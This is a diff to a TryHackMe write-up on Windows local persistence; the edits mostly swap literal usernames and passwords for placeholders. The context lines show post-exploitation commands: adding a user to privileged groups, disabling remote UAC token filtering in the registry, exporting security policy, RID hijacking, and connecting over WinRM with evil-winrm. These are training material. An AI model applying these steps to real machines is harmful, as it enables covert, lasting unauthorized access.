@@ -3,7 +3,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 07/05/2023
+This writeup was last updated: 07/06/2023
 
 # Assigning Group Memberships
 1. Start this room's machine and our TryHackMe AttackBox
@@ -11,12 +11,12 @@ This writeup was last updated: 07/05/2023
 ```PowerShell
 C:\Users\Administrator>cd \
 ```
-3. `net localgroup “Backup Operators” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Backup Operators** group, which won't give our target user administrative privileges but it will allow them to read and write to files within its system regardless of the system's DACL configurations and any other set permissions that may prevent users from accessing those files
+3. `net localgroup “Backup Operators” <USER> /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Backup Operators** group, which won't give our target user administrative privileges but it will allow them to read and write to files within its system regardless of the system's DACL configurations and any other set permissions that may prevent users from accessing those files
 ```PowerShell
 C:\>net localgroup "Backup Operators" thmuser1 /add
 The command completed successfully.
 ```
-4. `net localgroup “Remote Management Users” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Remote Management Users** group in order to have our target user be able to connect back to the compromised machine using WinRM
+4. `net localgroup “Remote Management Users” <USER> /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Remote Management Users** group in order to have our target user be able to connect back to the compromised machine using WinRM
 ```PowerShell
 C:\>net localgroup "Remote Management Users" thmuser1 /add
 The command completed successfully.
@@ -33,7 +33,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
-7. `evil-winrm -i <TARGET IP> -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
+7. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
 ```Bash
 root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321
 
@@ -200,7 +200,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ```
 6. `secedit /export /cfg {FILENAME1}.inf` from the compromised Windows machine to export the compromised machine's security configuration as an information file (**.inf**)
 ```PowerShell
-PS C:\> secedit /export /cfg CONFIG.inf
+PS C:\> secedit /export /cfg config.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
@@ -279,7 +279,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
-15. `evil-winrm -i <TARGET IP> -u thmuser2 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
+15. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
 ```Bash
 root@ip-10-10-254-192:~# evil-winrm -i 10.10.56.140 -u thmuser2 -p Password321
 
@@ -354,7 +354,7 @@ Sysinternals - www.sysinternals.com
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20New%20RID.png)
 
-7. `evil-winrm -i <TARGET IP> -u thmuser3 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser3) using WinRM, which ended up not working since our user isn't part of the **Remote Management Group** by default, so instead we'll connect to the compromised machine using RDP
+7. `evil-winrm -i <TARGET IP> -u <USER> -p <PASSWORD>` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser3) using WinRM, which ended up not working since our user isn't part of the **Remote Management Group** by default, so instead we'll connect to the compromised machine using RDP
 ```Bash
 root@ip-10-10-28-182:~# evil-winrm -i 10.10.159.254 -u thmuser3 -p Password321
 
